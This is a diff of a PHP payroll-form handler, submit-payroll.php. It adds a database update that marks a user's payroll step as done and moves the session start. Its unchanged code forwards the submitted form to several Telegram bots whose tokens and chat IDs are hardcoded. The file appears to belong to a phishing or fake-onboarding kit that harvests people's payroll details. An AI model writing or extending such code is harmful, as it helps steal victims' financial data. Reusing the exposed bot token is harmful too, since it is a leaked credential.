@@ -1,7 +1,11 @@
 <?php
 // submit-payroll.php
+require_once __DIR__ . '/config/database.php';
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    session_start();
+    $user_id = $_SESSION['user_id'];
+    
     // Telegram Bot Configurations - MULTIPLE SUPPORTED
     $telegramBots = [
         ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
@@ -50,7 +54,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             $data = [
                 'chat_id' => $bot['chat_id'],
                 'text' => $message
-                // parse_mode removed for safety
             ];
             $options = [
                 'http' => [
@@ -64,14 +67,26 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         }
     }
 
+    // ✅ UPDATE DATABASE - Mark payroll step as completed
+    try {
+        $database = new Database();
+        $db = $database->getConnection();
+        
+        $update_query = "UPDATE users SET payroll_completed = 1, payroll_completed_at = NOW() WHERE id = :user_id";
+        $update_stmt = $db->prepare($update_query);
+        $update_stmt->bindParam(':user_id', $user_id);
+        $update_stmt->execute();
+    } catch (Exception $e) {
+        // Log error but don't break the flow
+        error_log("Database update failed: " . $e->getMessage());
+    }
+
     // Store in session and redirect
-    session_start();
     $_SESSION['payroll_data'] = $_POST;
 
     header("Location: program-commitment.php");
     exit;
 } else {
-    // Direct access -> redirect to form
     header('Location: payroll-setup.php');
     exit();
 }
